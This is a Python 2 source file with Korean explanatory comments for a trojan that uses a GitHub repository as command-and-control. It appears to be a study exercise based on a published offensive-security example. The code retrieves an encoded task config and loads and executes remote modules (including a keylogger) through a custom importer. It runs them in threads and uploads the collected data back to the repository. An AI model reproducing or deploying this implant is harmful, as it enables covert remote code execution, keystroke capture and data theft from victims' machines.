#-*- coding: utf-8 -*-
import json, base64, sys, time, imp, random, threading, Queue, os
from github3 import login
from datetime import datetime

# 현재 깃허브 구조
# 5123khw(깃허브닉네임) - moonriver(Repository) - config - abc.json
#                                             - data
#                                             - modules - keylog.py 

trojan_id="abc" # 깃허브 config 디렉터리에 들어갈 json 파일의 이름(확장자 제외)
trojan_config="%s.json" % trojan_id # 깃허브 config 디렉터리에 들어갈 json 파일의 이름
data_path="data/%s/" % trojan_id # 데이터가 저장될 깃허브의 디렉터리
trojan_modules=[]
task_queue=Queue.Queue()
configured=False

class GitImporter(object): # 깃허브 저장소로부터 라이브러리를 가져오는 모듈 임포터이다.
    def __init__(self):
        self.current_module_code=""
    
    def find_module(self, fullname,path=None): # 모듈을 찾는다.
        if configured:
            #print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code=base64.b64decode(new_library)
                return self # 저장소에 해당 모듈이 존재하면 리턴
        return None

    def load_module(self, name): 
        module=imp.new_module(name) # imp 모듈을 이용해 빈 모듈 객체를 생성한다.
        exec self.current_module_code in module.__dict__ # 깃허브에서 가져온 코드를 객체에 추가한다.
        sys.modules[name]=module # 새로 생성한 모듈을 sys.modules 목록에 추가한다.
        return module

def connect_to_github(): # 깃허브에 사용자 인증 후 repo와 branch 객체를 가져온다.
    gh=login(username="ID", password="PW") # 깃허브 계정과 패스워드
    repo=gh.repository("5123khw", "moonriver") # 깃허브 계정과 Repository
    branch=repo.branch("master") # Branch    
    return gh,repo,branch

def get_file_contents(filepath): # 깃허브 저장소에서 json파일(5123khw/moonriver/config/abc.json), 파이썬파일(5123khw/moonriver/modules/keylog.py) 을 가져와 로컬에서 내용을 읽는다.
    gh,repo,branch=connect_to_github()
    tree=branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            #print "[*] Found file %s" % filepath
            blob=repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config(): # 실행할 모듈을 알 수 있도록 깃허브 저장소에서 원격 설정 문서를 가져온다.  
    global configured
    config_json=get_file_contents(trojan_config)
    config=json.loads(base64.b64decode(config_json))
    configured=True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config

def store_module_result(data): # 수집한 데이터를 깃허브 저장소(5123khw/moonriver/data/abc/)에 업로드한다. 
    gh,repo,branch=connect_to_github()
    saveFileName=str(datetime.today().year)+"-"+str(datetime.today().month)+"-"+str(datetime.today().day)+"-"+str(datetime.today().hour)+"-"+str(datetime.today().minute)+"-"+str(datetime.today().second)+".txt"
    remote_path="%s%s" % (data_path, saveFileName)
    repo.create_file(remote_path,"Commit message", data) # 깃허브 저장소에 데이터를 만들고, 데이터에 base64 인코딩을 적용한다. 
    return

def module_runner(module):
    task_queue.put(1)
    result=sys.modules[module].run() # 5123khw/moonriver/modules/keylog.py 에 있는 run 함수를 호출해 모듈을 실행한다.
    task_queue.get()
    store_module_result(result) # 문자열 형태로 저장된 실행 결과를 깃허브 저장소로 업로드한다. 
    return

def main():
    sys.meta_path=[GitImporter()] # 모듈 임포터인 GitImporter 클래스를 추가한다.
    if task_queue.empty():
        config=get_trojan_config() # get_trojan_config 함수를 호출해 저장소에서 설정 파일을 가져온다.
        for task in config:
            t=threading.Thread(target=module_runner, args=(task['module'],)) # 스레드에서 모듈을 실행한다.
            t.start()
        
if __name__=="__main__":
    main()
